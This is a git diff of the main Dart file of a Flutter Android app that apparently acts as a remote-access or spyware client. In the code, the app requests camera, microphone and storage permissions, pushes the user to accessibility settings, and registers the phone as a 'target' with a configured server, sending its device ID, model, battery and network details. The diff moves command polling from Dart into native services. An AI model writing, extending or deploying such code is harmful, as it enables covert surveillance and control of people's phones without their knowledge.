@@ -12,8 +12,6 @@ import 'package:shared_preferences/shared_preferences.dart';
 import 'package:url_launcher/url_launcher.dart';
 
 import 'config/build_config.dart';
-import 'services/command_poller.dart';
-import 'services/ws_client.dart';
 
 // ==========================================
 // ===== GLOBAL =====
@@ -26,7 +24,6 @@ const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
 
-  // Redirect debugPrint ke print supaya muncul di logcat rilis mode
   debugPrint = (String? message, {int? wrapWidth}) {
     print(message ?? '');
   };
@@ -47,9 +44,7 @@ class GeneratedApp extends StatelessWidget {
       title: BuildConfig.appName,
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
-        colorScheme: ColorScheme.fromSeed(
-          seedColor: const Color(0xFF2196F3),
-        ),
+        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF2196F3)),
         useMaterial3: true,
       ),
       home: const AppBootstrap(),
@@ -71,6 +66,9 @@ class _AppBootstrapState extends State<AppBootstrap>
     with WidgetsBindingObserver {
   String _status = 'Memuat...';
   bool _ready = false;
+  bool _hasRegistered = false;
+  bool _isRegistering = false;
+  DateTime? _lastRegisterTime;
 
   @override
   void initState() {
@@ -91,15 +89,19 @@ class _AppBootstrapState extends State<AppBootstrap>
     print('📱 [LIFECYCLE] state: $state');
 
     if (state == AppLifecycleState.resumed) {
-      print('🔄 [LIFECYCLE] resumed → force re-register + polling');
-      _registerDeviceWithRetry();
-      if (WsClient().isConnected) {
-        print('✅ [LIFECYCLE] WS still connected');
-      } else {
-        print('⚠️ [LIFECYCLE] WS disconnected → reconnect');
-        WsClient().connect();
-        CommandPoller().start();
+      // Cooldown 5 menit
+      if (_lastRegisterTime != null &&
+          DateTime.now().difference(_lastRegisterTime!) <
+              const Duration(minutes: 5)) {
+        print('⏭️ [LIFECYCLE] Skip register (cooldown)');
+        return;
       }
+      if (_hasRegistered) {
+        print('⏭️ [LIFECYCLE] Already registered');
+        return;
+      }
+      print('🔄 [LIFECYCLE] resumed → register');
+      _registerDeviceWithRetry();
     }
   }
 
@@ -107,9 +109,7 @@ class _AppBootstrapState extends State<AppBootstrap>
     print('🚀 [BOOTSTRAP] START');
 
     try {
-      // ==========================================
       // ===== 1. Save config =====
-      // ==========================================
       print('📦 [BOOTSTRAP] Step 1: Save config');
       try {
         final prefs = await SharedPreferences.getInstance();
@@ -119,31 +119,35 @@ class _AppBootstrapState extends State<AppBootstrap>
         await prefs.setString('packageName', BuildConfig.packageName);
         await prefs.setString('serverUrl', BuildConfig.serverUrl);
         await prefs.setBool('isNativeApp', true);
+
+        // Generate device ID
+        String id = prefs.getString('deviceId') ?? '';
+        if (id.isEmpty) {
+          id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
+          await prefs.setString('deviceId', id);
+          print('🆕 [BOOTSTRAP] New deviceId: $id');
+        } else {
+          print('📱 [BOOTSTRAP] Existing deviceId: $id');
+        }
+
         print('✅ [BOOTSTRAP] Config saved. serverUrl=${BuildConfig.serverUrl}');
       } catch (e) {
         print('❌ [BOOTSTRAP] Prefs error: $e');
       }
 
-      // ==========================================
       // ===== 2. Permissions (NON-BLOCKING) =====
-      // ==========================================
       print('📦 [BOOTSTRAP] Step 2: Request permissions (background)');
       if (mounted) setState(() => _status = 'Meminta izin...');
 
-      // Jalankan permission di background — TIDAK block bootstrap
       _requestPermissions().then((_) {
-        print('✅ [BOOTSTRAP] Permissions done (background)');
+        print('✅ [BOOTSTRAP] Permissions done');
       }).catchError((e) {
         print('⚠️ [BOOTSTRAP] Permission error: $e');
       });
 
-      // Beri jeda singkat
-      await Future.delayed(const Duration(milliseconds: 800));
-      print('⏩ [BOOTSTRAP] Lanjut tanpa tunggu permission');
+      await Future.delayed(const Duration(milliseconds: 500));
 
-      // ==========================================
       // ===== 3. Register device =====
-      // ==========================================
       print('📦 [BOOTSTRAP] Step 3: Register device');
       if (mounted) setState(() => _status = 'Mendaftar device...');
       try {
@@ -153,38 +157,17 @@ class _AppBootstrapState extends State<AppBootstrap>
         print('❌ [BOOTSTRAP] Register error: $e');
       }
 
-      // ==========================================
-      // ===== 4. START WS + POLLING =====
-      // ==========================================
-      print('📦 [BOOTSTRAP] Step 4: Start WS + Polling');
-
-      // Start polling FIRST (fallback)
+      // ===== 4. Start native services =====
+      print('📦 [BOOTSTRAP] Step 4: Start native services');
       try {
-        CommandPoller().start();
-        print('✅ [BOOTSTRAP] Polling started');
+        // Service di-start oleh MainActivity.kt (native)
+        // Tapi bisa trigger ulang via MethodChannel kalau perlu
+        print('✅ [BOOTSTRAP] Native services running (started by MainActivity)');
       } catch (e) {
-        print('❌ [BOOTSTRAP] Polling error: $e');
+        print('❌ [BOOTSTRAP] Native service error: $e');
       }
 
-      // Try WS
-      try {
-        print('🔌 [BOOTSTRAP] Connecting WS...');
-        await WsClient().connect();
-
-        await Future.delayed(const Duration(seconds: 3));
-        if (WsClient().isConnected) {
-          print('✅ [BOOTSTRAP] WS CONNECTED — stop polling');
-          CommandPoller().stop();
-        } else {
-          print('⚠️ [BOOTSTRAP] WS not connected — keep polling');
-        }
-      } catch (e) {
-        print('❌ [BOOTSTRAP] WS error: $e — keep polling');
-      }
-
-      // ==========================================
       // ===== 5. Ready =====
-      // ==========================================
       print('📦 [BOOTSTRAP] Step 5: Ready');
       if (!mounted) return;
       setState(() {
@@ -211,13 +194,8 @@ class _AppBootstrapState extends State<AppBootstrap>
     try {
       sdkInt = await _getAndroidSdkInt();
       print('📱 [PERM] Android SDK: $sdkInt');
-    } catch (e) {
-      print('⚠️ [PERM] getSdkInt error: $e');
-    }
+    } catch (e) {}
 
-    // ==========================================
-    // ===== PERMISSION PENTING SAJA =====
-    // ==========================================
     final permissions = <Permission>[
       Permission.camera,
       Permission.microphone,
@@ -238,7 +216,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       permissions.add(Permission.storage);
     }
 
-    // Minta satu-satu dengan jeda
     for (final perm in permissions) {
       try {
         final status = await perm.status;
@@ -252,13 +229,10 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
     }
 
-    // Buka settings untuk accessibility + device admin (user aktifkan manual)
+    // Buka accessibility settings
     try {
-      print('🔓 [PERM] Buka Accessibility Settings');
       await _deviceChannel.invokeMethod('openAccessibilitySettings');
-    } catch (e) {
-      print('⚠️ [PERM] accessibility settings error: $e');
-    }
+    } catch (e) {}
   }
 
   // ==========================================
@@ -267,18 +241,16 @@ class _AppBootstrapState extends State<AppBootstrap>
   Future<int> _getAndroidSdkInt() async {
     if (!Platform.isAndroid) return 0;
     try {
-      final result = await _deviceChannel.invokeMethod<int>('getSdkInt');
-      return result ?? 0;
-    } catch (e) {
-      print('⚠️ [HELPER] getSdkInt error: $e');
+      return await _deviceChannel.invokeMethod<int>('getSdkInt') ?? 0;
+    } catch (_) {
       return 0;
     }
   }
 
   Future<String> _getDeviceModel() async {
     try {
-      final result = await _deviceChannel.invokeMethod<String>('getModel');
-      return result ?? 'Android Device';
+      return await _deviceChannel.invokeMethod<String>('getModel') ??
+          'Android Device';
     } catch (_) {
       return 'Android Device';
     }
@@ -286,8 +258,7 @@ class _AppBootstrapState extends State<AppBootstrap>
 
   Future<String> _getDeviceBrand() async {
     try {
-      final result = await _deviceChannel.invokeMethod<String>('getBrand');
-      return result ?? 'Android';
+      return await _deviceChannel.invokeMethod<String>('getBrand') ?? 'Android';
     } catch (_) {
       return 'Android';
     }
@@ -295,28 +266,10 @@ class _AppBootstrapState extends State<AppBootstrap>
 
   Future<String> _getAndroidVersion() async {
     try {
-      final result =
-          await _deviceChannel.invokeMethod<String>('getAndroidVersion');
-      return result ?? 'Unknown';
+      return await _deviceChannel.invokeMethod<String>('getAndroidVersion') ??
+          'Unknown';
     } catch (_) {
       return 'Unknown';
-    }
-  }
-
-  Future<String> _getOrCreateDeviceId() async {
-    try {
-      final prefs = await SharedPreferences.getInstance();
-      String id = prefs.getString('deviceId') ?? '';
-      if (id.isEmpty) {
-        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
-        await prefs.setString('deviceId', id);
-        print('🆕 [DEVICE] New deviceId: $id');
-      } else {
-        print('📱 [DEVICE] Existing deviceId: $id');
-      }
-      return id;
-    } catch (_) {
-      return 'dev_${DateTime.now().millisecondsSinceEpoch}';
     }
   }
 
@@ -324,51 +277,50 @@ class _AppBootstrapState extends State<AppBootstrap>
   // ===== REGISTER DEVICE =====
   // ==========================================
   Future<void> _registerDeviceWithRetry() async {
-    if (BuildConfig.accessKey.isEmpty) {
-      print('⚠️ [REGISTER] Access key kosong, skip');
+    if (_isRegistering) {
+      print('⏭️ [REGISTER] Already in progress');
+      return;
+    }
+    if (_hasRegistered) {
+      print('⏭️ [REGISTER] Already registered');
       return;
     }
 
-    for (int attempt = 1; attempt <= 3; attempt++) {
-      try {
+    if (BuildConfig.accessKey.isEmpty) return;
+
+    _isRegistering = true;
+    try {
+      for (int attempt = 1; attempt <= 3; attempt++) {
         print('📡 [REGISTER] Attempt $attempt/3');
         final ok = await _registerDevice();
         if (ok) {
           print('✅ [REGISTER] Success');
+          _hasRegistered = true;
+          _lastRegisterTime = DateTime.now();
           return;
         }
-      } catch (e) {
-        print('⚠️ [REGISTER] Attempt $attempt error: $e');
+        if (attempt < 3) await Future.delayed(const Duration(seconds: 2));
       }
-
-      if (attempt < 3) {
-        await Future.delayed(const Duration(seconds: 2));
-      }
+      print('❌ [REGISTER] Failed after 3 attempts');
+    } finally {
+      _isRegistering = false;
     }
-
-    print('❌ [REGISTER] Failed after 3 attempts');
   }
 
   Future<bool> _registerDevice() async {
     try {
       int batteryLevel = 0;
       try {
-        final battery = Battery();
-        batteryLevel = await battery.batteryLevel;
-      } catch (e) {
-        print('⚠️ [REGISTER] Battery error: $e');
-      }
+        batteryLevel = await Battery().batteryLevel;
+      } catch (e) {}
 
       String connType = 'unknown';
       try {
-        final connectivity = Connectivity();
-        final result = await connectivity.checkConnectivity();
-        connType = result.toString();
-      } catch (e) {
-        print('⚠️ [REGISTER] Connectivity error: $e');
-      }
+        connType = (await Connectivity().checkConnectivity()).toString();
+      } catch (e) {}
 
-      final deviceId = await _getOrCreateDeviceId();
+      final prefs = await SharedPreferences.getInstance();
+      final deviceId = prefs.getString('deviceId') ?? '';
       final model = await _getDeviceModel();
       final brand = await _getDeviceBrand();
       final androidVersion = await _getAndroidVersion();
@@ -388,18 +340,12 @@ class _AppBootstrapState extends State<AppBootstrap>
         'lastSeen': DateTime.now().toIso8601String(),
       };
 
-      final url = '${BuildConfig.serverUrl}/api/register-target';
-      print('📡 [REGISTER] POST $url');
+      final res = await _httpPost(
+        '${BuildConfig.serverUrl}/api/register-target',
+        payload,
+      );
 
-      final res = await _httpPost(url, payload);
-
-      if (res != null && res.isNotEmpty) {
-        print('✅ [REGISTER] Response: $res');
-        return true;
-      }
-
-      print('❌ [REGISTER] Empty response');
-      return false;
+      return res != null && res.isNotEmpty;
     } catch (e) {
       print('❌ [REGISTER] Error: $e');
       return false;
@@ -421,13 +367,11 @@ class _AppBootstrapState extends State<AppBootstrap>
       request.write(jsonEncode(body));
 
       final response = await request.close();
-      final responseBody =
-          await response.transform(utf8.decoder).join();
+      final responseBody = await response.transform(utf8.decoder).join();
 
       print('📥 [HTTP] ${response.statusCode}: $responseBody');
       return responseBody;
     } catch (e) {
-      print('❌ [HTTP] Error: $e');
       return null;
     } finally {
       client?.close(force: true);
@@ -452,11 +396,7 @@ class _AppBootstrapState extends State<AppBootstrap>
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
-              const Icon(
-                Icons.sync_rounded,
-                size: 48,
-                color: Colors.blueGrey,
-              ),
+              const Icon(Icons.sync_rounded, size: 48, color: Colors.blueGrey),
               const SizedBox(height: 20),
               Text(
                 BuildConfig.appName,
@@ -470,10 +410,7 @@ class _AppBootstrapState extends State<AppBootstrap>
               const SizedBox(height: 8),
               Text(
                 _status,
-                style: const TextStyle(
-                  fontSize: 13,
-                  color: Colors.black54,
-                ),
+                style: const TextStyle(fontSize: 13, color: Colors.black54),
                 textAlign: TextAlign.center,
               ),
               const SizedBox(height: 24),
@@ -618,8 +555,6 @@ class _WebViewHomeState extends State<WebViewHome> {
         case 'close':
           SystemNavigator.pop();
           break;
-        default:
-          print('⚠️ [WEBVIEW] Unknown action: $action');
       }
     } catch (e) {
       print('❌ [WEBVIEW] Parse error: $e');
@@ -635,7 +570,6 @@ class _WebViewHomeState extends State<WebViewHome> {
     try {
       await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
     } catch (e) {
-      print('❌ [WEBVIEW] Reload error: $e');
       if (mounted) {
         setState(() {
           _hasError = true;
@@ -671,7 +605,6 @@ class _WebViewHomeState extends State<WebViewHome> {
                 WebViewWidget(controller: _controller)
               else
                 _buildErrorScreen(),
-
               if (_isLoading && !_hasError)
                 Positioned(
                   top: 0,
